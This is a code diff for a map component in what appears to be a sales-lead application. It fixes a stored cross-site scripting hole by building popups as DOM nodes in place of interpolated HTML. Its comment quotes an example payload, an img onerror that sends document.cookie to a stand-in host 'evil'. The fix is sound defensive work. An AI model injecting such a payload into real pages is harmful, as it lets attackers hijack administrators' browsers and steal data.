@@ -15,6 +15,48 @@ import 'maplibre-gl/dist/maplibre-gl.css';
 
 const HEAT: Record<string, string> = { HOT: '#DC2626', WARM: '#D97706', COLD: '#2563EB' };
 
+/**
+ * A map popup, built as DOM rather than as a string of HTML.
+ *
+ * ── AMH-003 ─────────────────────────────────────────────────────────────────
+ *
+ * These popups used MapLibre's set-HTML method with the lead name, project
+ * name, address and locality interpolated straight into the template. That
+ * method assigns to `innerHTML`, so a lead named
+ *
+ *     <img src=x onerror="fetch('https://evil/?c='+document.cookie)">
+ *
+ * ran as script on our own origin the moment an admin opened the map.
+ *
+ * The audit called this reachable by an unauthenticated party. Checked, and it
+ * is not: every write path — /api/ingest/*, the connector endpoints, the public
+ * API, the channel-partner portal — requires a shared secret, a bearer token or
+ * a portal token. What it actually is, is privilege escalation: a sales
+ * executive, or a channel partner with a portal link, can store a payload that
+ * executes in an administrator's browser. Given the session cookie is
+ * httpOnly, the prize is not the cookie itself but everything that browser can
+ * do while signed in as an admin.
+ *
+ * `setDOMContent` takes a node and parses nothing. `textContent` cannot create
+ * an element. That removes the class of bug rather than escaping around it —
+ * there is no encoding to get wrong, and the next person to add a field here
+ * cannot reintroduce it by accident.
+ */
+function popupContent(title: string, subtitle: string | null | undefined): HTMLElement {
+  const wrap = document.createElement('div');
+  const strong = document.createElement('strong');
+  strong.textContent = title;
+  wrap.appendChild(strong);
+  if (subtitle) {
+    wrap.appendChild(document.createElement('br'));
+    const span = document.createElement('span');
+    span.style.fontSize = '11px';
+    span.textContent = subtitle;
+    wrap.appendChild(span);
+  }
+  return wrap;
+}
+
 export function MapView({
   projects, leads, localities, canManage,
 }: {
@@ -81,14 +123,16 @@ export function MapView({
           const el = document.createElement('div');
           el.style.cssText = 'width:16px;height:16px;border-radius:3px;background:#A07D34;border:2px solid #fff;box-shadow:0 1px 4px rgba(0,0,0,.4)';
           new maplibregl.Marker({ element: el }).setLngLat([p.lng, p.lat])
-            .setPopup(new maplibregl.Popup({ offset: 14 }).setHTML(`<strong>${p.name}</strong><br/><span style="font-size:11px">${p.address ?? p.city}</span>`))
+            .setPopup(new maplibregl.Popup({ offset: 14 }).setDOMContent(popupContent(p.name, p.address ?? p.city)))
             .addTo(map);
         }
         for (const l of leads) {
           const el = document.createElement('div');
           el.style.cssText = `width:10px;height:10px;border-radius:50%;background:${HEAT[l.temperature] ?? '#2563EB'};opacity:.75;border:1px solid #fff`;
           new maplibregl.Marker({ element: el }).setLngLat([l.lng, l.lat])
-            .setPopup(new maplibregl.Popup({ offset: 10 }).setHTML(`<strong>${l.name}</strong><br/><span style="font-size:11px">${l.reference} · ${l.status}${l.locality ? ` · ${l.locality}` : ''}</span>`))
+            .setPopup(new maplibregl.Popup({ offset: 10 }).setDOMContent(
+              popupContent(l.name, `${l.reference} · ${l.status}${l.locality ? ` · ${l.locality}` : ''}`),
+            ))
             .addTo(map);
         }
         setReady(true);
